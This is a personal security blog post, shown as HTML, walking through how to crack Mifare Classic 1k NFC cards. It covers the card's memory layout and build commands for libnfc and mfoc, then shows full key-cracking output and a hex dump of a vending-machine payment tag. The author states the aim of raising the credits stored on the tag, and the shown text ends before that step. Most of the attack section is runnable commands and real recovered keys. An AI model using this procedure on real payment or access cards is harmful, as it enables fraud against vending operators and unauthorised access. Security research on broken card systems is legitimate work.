<!doctype html>
<html lang="en" prefix="og: http://ogp.me/ns#">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>How to Crack Mifare Classic Cards</title>
  <meta name="description"
    content="How to Crack Mifare Classic Cards">
  
  <meta name="author" content="Christian Mehlmauer">

  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:site" content="@firefart" />
  <meta name="twitter:creator" content="@firefart" />
  
  <meta name="twitter:title" content="How to Crack Mifare Classic Cards">
  <meta name="twitter:description"
    content="How to Crack Mifare Classic Cards">
  <meta property="og:title" content="How to Crack Mifare Classic Cards">
  <meta property="og:type" content="article">
  <meta property="og:url" content="https://firefart.at/post/how-to-crack-mifare-classic-cards/" />
  <meta property="og:description"
    content="How to Crack Mifare Classic Cards">
  
  <meta property="og:image" content="https://www.gravatar.com/avatar/530ee2111e51f3d8379b1081d13bf345.png?s=400" />
  <meta name="twitter:image" content="https://www.gravatar.com/avatar/530ee2111e51f3d8379b1081d13bf345.png?s=400" />
  
  <meta property="og:updated_time" content="2015-04-21 19:20:00 &#43;0100 &#43;0100" />
  <meta property="article:author" content="https://twitter.com/firefart" />

  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet"
    type="text/css">
  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">

  <link rel="stylesheet" href='https://firefart.at/css/all.css'>
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">

  
  
  <script type="application/ld+json">
    [{
        "@context": "http://schema.org",
        "@type": "WebSite",
        "name": "firefart",
        "url": "https://firefart.at"
      },
      {
        "@context": "http://schema.org",
        "@type": "Person",
        "name": "Christian Mehlmauer",
        "url": "https://firefart.at",
        "sameAs": [
          "https://twitter.com/firefart",
          "https://github.com/firefart",
          "https://www.linkedin.com/in/firefart/"
        ]
      }
    ]
  </script>

</head>

<body>

<div id="layout" class="pure-g">
    <div class="sidebar pure-u-1 pure-u-md-1-4">
    <div class="header">
        <h1 class="brand-title"><a href="/">firefart</a></h1>
        <h2 class="brand-tagline"> that austrian security guy </h2>

        <nav class="nav">
            <ul class="nav-list">
                
                <li class="nav-item">
                    <a class="pure-button" target="_blank" href="https://twitter.com/firefart">
                        <i class="fa fa-twitter"></i> Twitter
                    </a>
                </li>
                
                
                <li class="nav-item">
                    <a class="pure-button" target="_blank" href="https://github.com/firefart">
                        <i class="fa fa-github-alt"></i> Github
                    </a>
                </li>
                
                
                
                <li class="nav-item">
                    <a class="pure-button" href="/page/about/"><i class="fa fa-info"></i> about me</a>
                </li>
                <li class="nav-item">
                    <a class="pure-button" target="_blank" href='https://firefart.at/index.xml'>
                        <i class="fa fa-rss"></i> rss
                    </a>
                </li>
            </ul>
        </nav>
    </div>
</div>

    <div class="content pure-u-1 pure-u-md-3-4">
        <div>
            
            <div class="posts">
                <h1 class="content-subhead">21 Apr 2015, 19:20</h1>
                <section class="post">
                    <header class="post-header">

                        <a href="/post/how-to-crack-mifare-classic-cards/" class="post-title">How to Crack Mifare Classic Cards</a>

                        <p class="post-meta">
                            
                            
                        </p>
                    </header>

                    <div id="toc" class="well col-md-4 col-sm-6">
                        <nav id="TableOfContents"></nav>
                    </div>

                    <div class="post-description">
                        <p>In this blog post I will cover some quick basics about NFC, Mifare Classic and how to set up everything for reading and writing a NFC tag. At the end I show you how to reprogram a vending machine&rsquo;s NFC tag to contain more credits.</p>
<p>NFC stands for Near Field Communication and is used to communicate over short distances. For more Infos on NFC you can read the <a href="http://en.wikipedia.org/wiki/Near_field_communication">Wikipedia article</a>. NFC nowadays is used for access cards, public transport, some more and in this case: Vending Machines. Basically there is an active NFC enabled device (the reader) and a passive device (the tag). The active device scans for the passive one and establishes a connection on contact. It also powers the passive device via an electromagnetic field. There is also an active - active mode where both endpoints can send data and need to be powered seperately. This is usually used when sending data for example in &ldquo;Android Beam&rdquo;.</p>
<p>In this example the vending machine has an active NFC reader built in. You can touch it with your tag to buy some drinks and the corresponding price is subtracted from the ammount stored on the tag. You can also recharge your tag via the machine if you run out of credits.</p>
<p>The NFC tag I analyzed is a so called &ldquo;Mifare Classic 1k&rdquo; tag. 1k stands for the size of data the tag can store. There are also other types like the &ldquo;Mifare Classic 4k&rdquo; and the &ldquo;Mifare Mini&rdquo; each having a different memory size.</p>
<p>Mifare Classic in general is stated insecure, because it&rsquo;s encryption protocol has been cracked.
More deatiled Information about this can be found in the following links:</p>
<p><a href="http://www.cs.ru.nl/~flaviog/publications/Attack.MIFARE.pdf">http://www.cs.ru.nl/~flaviog/publications/Attack.MIFARE.pdf</a></p>
<p><a href="http://www.cs.ru.nl/~flaviog/publications/Dismantling.Mifare.pdf">http://www.cs.ru.nl/~flaviog/publications/Dismantling.Mifare.pdf</a></p>
<p><a href="http://www.cs.ru.nl/~flaviog/publications/Pickpocketing.Mifare.pdf">http://www.cs.ru.nl/~flaviog/publications/Pickpocketing.Mifare.pdf</a></p>
<p>A Mifare Classic 1k tag contains 16 sectors. Each of these sectors has 3 blocks of data storage and 1 block for storing the secret access keys and access controls. Each block contains 16 bytes of data.
Before reading a sector, the reader must authenticate to the tag with a secret access key. Each sector has two keys: Key A and Key B
Each of the 16 sectors can define it&rsquo;s own access right and wich key is needed for a particular action. As an example you can define to use Key A for reading the block and Key B for writing to it.
Sector 0 Block 0 also contains a non changeable UID (the tags unique ID) and some manufacturer data. This section is only writeable on some special chinese tags.</p>
<p>Here is a basically memory layout of a Mifare Classic tag:</p>
<p><a href="/img/mifare/mifare_memory_layout.png"><img src="/img/mifare/mifare_memory_layout_thumb.png" alt="Layout" title="Layout"></a></p>
<p>(taken from the Mifare Datasheet, link see below)</p>
<p>More about Mifare in general can be found on <a href="http://en.wikipedia.org/wiki/MIFARE">Wikipedia</a>. For more information on Mifare 1k Tags, the memory layout and more details you can visit these pages:</p>
<p><a href="http://www.fuzzysecurity.com/tutorials/rfid/2.html">http://www.fuzzysecurity.com/tutorials/rfid/2.html</a></p>
<p><a href="http://cache.nxp.com/documents/data_sheet/MF1S50YYX_V1.pdf">http://cache.nxp.com/documents/data_sheet/MF1S50YYX_V1.pdf (Section 8.6)</a></p>
<p>Now I will demonstrate how to get all access keys for all sectors, locate the credits and modify them.</p>
<p>For this example I used the <a href="http://www.adafruit.com/products/364">PN532 Breakout Board from Adafruit</a> connected via an <a href="http://www.adafruit.com/products/954">USB UART TTL Cable</a> and as an alternative a Raspberry Pi with the PN352 Breakout Board. These items can be purchased from various online shops around the world.</p>
<p><a href="/img/mifare/mifare_breakoutboard.jpg"><img src="/img/mifare/mifare_breakoutboard_thumb.jpg" alt="breakout board" title="breakout board"></a></p>
<p><a href="/img/mifare/mifare_raspberry.jpg"><img src="/img/mifare/mifare_raspberry_thumb.jpg" alt="raspberry" title="raspberry"></a></p>
<p>For connection instructions on the Raspberry Pi please refer to <a href="https://learn.adafruit.com/adafruit-nfc-rfid-on-raspberry-pi/testing-it-out">https://learn.adafruit.com/adafruit-nfc-rfid-on-raspberry-pi/testing-it-out</a>.</p>
<p>Important notice: NFC and the used attack depend a lot on timing. Connecting a NFC device to a VM running linux will not work reliable because the drivers mess with this timing. I spent a lot of time finding this out, so please boot into a linux live cd for the following example or use a Raspberry Pi.</p>
<p>Here are the basics to set your machine up for getting the access keys.</p>
<p>The first step is to set up libnfc so the OS can communicate with the NFC reader. You can get the latest libnfc version from <a href="https://github.com/nfc-tools/libnfc/releases">https://github.com/nfc-tools/libnfc/releases</a>. At the time of writing the current version was 1.7.1.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt-get install autoconf libtool libusb-dev libpcsclite-dev build-essential
</span></span><span style="display:flex;"><span>wget https://github.com/nfc-tools/libnfc/releases/download/libnfc-1.7.1/libnfc-1.7.1.tar.bz2
</span></span><span style="display:flex;"><span>tar -jxvf libnfc-1.7.1.tar.bz2
</span></span><span style="display:flex;"><span>cd libnfc-1.7.1
</span></span><span style="display:flex;"><span>autoreconf -vis
</span></span><span style="display:flex;"><span>./configure --with-drivers<span style="color:#f92672">=</span>all --sysconfdir<span style="color:#f92672">=</span>/etc --prefix<span style="color:#f92672">=</span>/usr
</span></span><span style="display:flex;"><span>make
</span></span><span style="display:flex;"><span>sudo make install
</span></span><span style="display:flex;"><span>sudo mkdir /etc/nfc
</span></span><span style="display:flex;"><span>sudo mkdir /etc/nfc/devices.d
</span></span></code></pre></div><p>When using the USB TTL cable issue the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cp contrib/libnfc/pn532_via_uart2usb.conf.sample /etc/nfc/devices.d/pn532_via_uart2usb.conf
</span></span></code></pre></div><p>If you connect the breakout board directly to your Raspberry PI&rsquo;s UART pins you need to copy the following file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cp contrib/libnfc/pn532_uart_on_rpi.conf.sample /etc/nfc/devices.d/pn532_uart_on_rpi.conf
</span></span></code></pre></div><p>There are other config files like SPI too, just look in the <code>contrib/libnfc/</code> folder and select the appropriate file.</p>
<p>If you use Kali the libnfc library is already installed, but missing some drivers (in my case the uart driver). You can overwrite the Kali installation with the setup from above.</p>
<p>After installing we need to test the communication to the NFC-reader. Connect your NFC device and run the following command</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nfc-list
</span></span></code></pre></div><p>it should output something like (example with USB-UART Cable)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># nfc-list
</span></span><span style="display:flex;"><span>nfc-list uses libnfc 1.7.1
</span></span><span style="display:flex;"><span>NFC device: pn532_uart:/dev/ttyUSB0 opened
</span></span></code></pre></div><p>On a Raspberry Pi it shows</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># nfc-list
</span></span><span style="display:flex;"><span>nfc-list uses libnfc 1.7.1
</span></span><span style="display:flex;"><span>NFC device: pn532_uart:/dev/ttyAMA0 opened
</span></span></code></pre></div><p>Now your reader is connected and we can start cracking our keys. We will use the tool &ldquo;mfoc - Mifare Classic Offline Cracker&rdquo; available from <a href="https://github.com/nfc-tools/mfoc">https://github.com/nfc-tools/mfoc</a>. Kali linux has it already installed.</p>
<p>If you are not on KALI or you want the latest version of mfoc you need to compile it on your own by executing the following commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget -O mfoc-master.zip https://github.com/nfc-tools/mfoc/archive/master.zip
</span></span><span style="display:flex;"><span>unzip mfoc-master.zip
</span></span><span style="display:flex;"><span>cd mfoc-master/
</span></span></code></pre></div><p>or clone via git</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/nfc-tools/mfoc.git
</span></span><span style="display:flex;"><span>cd mfoc/
</span></span></code></pre></div><p>configure and install it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>autoreconf -vis
</span></span><span style="display:flex;"><span>./configure
</span></span><span style="display:flex;"><span>make
</span></span><span style="display:flex;"><span>make install
</span></span></code></pre></div><p>To start the key cracking connect your reader, place the tag on the antenna and run</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mfoc -O output.mfd
</span></span></code></pre></div><p>This command first looks for some default keys used by many Miface Classic tags and then tries to crack the missing keys. On my sample tag the whole procedure was done in under one minute.</p>
<p>If the tool outputs &ldquo;Maybe you should increase the number of probes&rdquo;, the cracking was not successful. I got this message when running in a VMWare environment or by using crappy hardware. Switching to the Adafruit breakout board and a dedicated linux solved the problem for me.</p>
<p>If you manage to crack all the keys you can see the HEX encoded contents of the key on your terminal and also in the output file output.mfd.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># mfoc -O output.mfd
</span></span><span style="display:flex;"><span>Found Mifare Classic 1k tag
</span></span><span style="display:flex;"><span>ISO/IEC 14443A (106 kbps) target:
</span></span><span style="display:flex;"><span>    ATQA (SENS_RES): 00  04
</span></span><span style="display:flex;"><span>* UID size: single
</span></span><span style="display:flex;"><span>* bit frame anticollision supported
</span></span><span style="display:flex;"><span>       UID (NFCID1): 8e  db  1a  2a
</span></span><span style="display:flex;"><span>      SAK (SEL_RES): 08
</span></span><span style="display:flex;"><span>* Not compliant with ISO/IEC 14443-4
</span></span><span style="display:flex;"><span>* Not compliant with ISO/IEC 18092
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Fingerprinting based on MIFARE type Identification Procedure:
</span></span><span style="display:flex;"><span>* MIFARE Classic 1K
</span></span><span style="display:flex;"><span>* MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1
</span></span><span style="display:flex;"><span>* SmartMX with MIFARE 1K emulation
</span></span><span style="display:flex;"><span>Other possible matches based on ATQA &amp; SAK values:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Try to authenticate to all sectors with default keys...
</span></span><span style="display:flex;"><span>Symbols: &#39;.&#39; no key found, &#39;/&#39; A key found, &#39;\&#39; B key found, &#39;x&#39; both keys found
</span></span><span style="display:flex;"><span>[Key: ffffffffffff] -&gt; [................]
</span></span><span style="display:flex;"><span>[Key: a0a1a2a3a4a5] -&gt; [////////////////]
</span></span><span style="display:flex;"><span>[Key: d3f7d3f7d3f7] -&gt; [////////////////]
</span></span><span style="display:flex;"><span>[Key: 000000000000] -&gt; [////////////////]
</span></span><span style="display:flex;"><span>[Key: b0b1b2b3b4b5] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>[Key: 4d3a99c351dd] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>[Key: 1a982c7e459a] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>[Key: aabbccddeeff] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>[Key: 714c5c886e97] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>[Key: 587ee5f9350f] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>[Key: a0478cc39091] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>[Key: 533cb6c723f6] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>[Key: 8fd0a4f256e9] -&gt; [xxxxxxxxxxxx////]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Sector 00 -  FOUND_KEY   [A]  Sector 00 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 01 -  FOUND_KEY   [A]  Sector 01 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 02 -  FOUND_KEY   [A]  Sector 02 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 03 -  FOUND_KEY   [A]  Sector 03 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 04 -  FOUND_KEY   [A]  Sector 04 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 05 -  FOUND_KEY   [A]  Sector 05 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 06 -  FOUND_KEY   [A]  Sector 06 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 07 -  FOUND_KEY   [A]  Sector 07 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 08 -  FOUND_KEY   [A]  Sector 08 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 09 -  FOUND_KEY   [A]  Sector 09 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 10 -  FOUND_KEY   [A]  Sector 10 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 11 -  FOUND_KEY   [A]  Sector 11 -  FOUND_KEY   [B]
</span></span><span style="display:flex;"><span>Sector 12 -  FOUND_KEY   [A]  Sector 12 -  UNKNOWN_KEY [B]
</span></span><span style="display:flex;"><span>Sector 13 -  FOUND_KEY   [A]  Sector 13 -  UNKNOWN_KEY [B]
</span></span><span style="display:flex;"><span>Sector 14 -  FOUND_KEY   [A]  Sector 14 -  UNKNOWN_KEY [B]
</span></span><span style="display:flex;"><span>Sector 15 -  FOUND_KEY   [A]  Sector 15 -  UNKNOWN_KEY [B]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Using sector 00 as an exploit sector
</span></span><span style="display:flex;"><span>Sector: 12, type B, probe 0, distance 18504 .....
</span></span><span style="display:flex;"><span>  Found Key: B [ad4fb33388bf]
</span></span><span style="display:flex;"><span>Sector: 13, type B, probe 0, distance 18502 .....
</span></span><span style="display:flex;"><span>  Found Key: B [2a6d9205e7ca]
</span></span><span style="display:flex;"><span>Sector: 14, type B, probe 0, distance 18500 .....
</span></span><span style="display:flex;"><span>Sector: 14, type B, probe 1, distance 18502 .....
</span></span><span style="display:flex;"><span>Sector: 14, type B, probe 2, distance 18502 .....
</span></span><span style="display:flex;"><span>  Found Key: B [b8a1f613cf3d]
</span></span><span style="display:flex;"><span>Sector: 15, type B, probe 0, distance 18502 .....
</span></span><span style="display:flex;"><span>  Found Key: B [bedb604cc9d1]
</span></span><span style="display:flex;"><span>Auth with all sectors succeeded, dumping keys to a file!
</span></span><span style="display:flex;"><span>Block 63, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  4b  44  bb  5a  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 62, type A, key a0a1a2a3a4a5 :00  00  51  5f  03  59  ef  00  00  00  00  00  4d  49  43  00
</span></span><span style="display:flex;"><span>Block 61, type B, key bedb604cc9d1 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
</span></span><span style="display:flex;"><span>Block 60, type B, key bedb604cc9d1 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
</span></span><span style="display:flex;"><span>Block 59, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  0f  00  ff  e5  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 58, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
</span></span><span style="display:flex;"><span>Block 57, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
</span></span><span style="display:flex;"><span>Block 56, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
</span></span><span style="display:flex;"><span>Block 55, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  0f  00  ff  4f  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 54, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
</span></span><span style="display:flex;"><span>Block 53, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
</span></span><span style="display:flex;"><span>Block 52, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
</span></span><span style="display:flex;"><span>Block 51, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  1e  11  ee  5a  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 50, type B, key ad4fb33388bf :00  01  59  01  00  6f  00  01  00  00  00  00  8c  c3  00  00
</span></span><span style="display:flex;"><span>Block 49, type B, key ad4fb33388bf :01  01  01  ee  ee  ee  ee  ee  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 48, type A, key a0a1a2a3a4a5 :88  01  00  84  00  04  b0  1a  00  00  5d  00  01  05  00  f1
</span></span><span style="display:flex;"><span>Block 47, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 46, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 45, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 44, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 43, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 42, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 41, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 40, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 39, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 38, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 37, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 36, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 35, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 34, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 33, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 32, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 31, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 30, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 29, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 28, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 27, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 26, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 25, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 24, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 23, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 22, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 21, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 20, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 19, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 18, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 17, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 16, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 15, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 14, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 13, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 12, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 11, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 10, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 09, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 08, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 07, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 06, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 05, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 04, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 03, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  61  e7  89  c1  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 02, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  09  38  09  38  09  38  09  38
</span></span><span style="display:flex;"><span>Block 01, type A, key a0a1a2a3a4a5 :d2  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
</span></span><span style="display:flex;"><span>Block 00, type A, key a0a1a2a3a4a5 :8e  db  1a  2a  65  88  04  00  48  85  14  90  59  80  01  11
</span></span></code></pre></div><p>The terminal output is upside down - the first block containing the UID is at the bottom. If you view the output.mfd file with hexdump you can see it in the right order.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># hexdump -vC output.mfd
</span></span><span style="display:flex;"><span>00000000  8e db 1a 2a 65 88 04 00  48 85 14 90 59 80 01 11  |...*e...H...Y...|
</span></span><span style="display:flex;"><span>00000010  d2 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000020  00 00 00 00 00 00 00 00  09 38 09 38 09 38 09 38  |.........8.8.8.8|
</span></span><span style="display:flex;"><span>00000030  a0 a1 a2 a3 a4 a5 61 e7  89 c1 b0 b1 b2 b3 b4 b5  |......a.........|
</span></span><span style="display:flex;"><span>00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000070  a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5  |......xw.i......|
</span></span><span style="display:flex;"><span>00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</span></span><span style="display:flex;"><span>00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
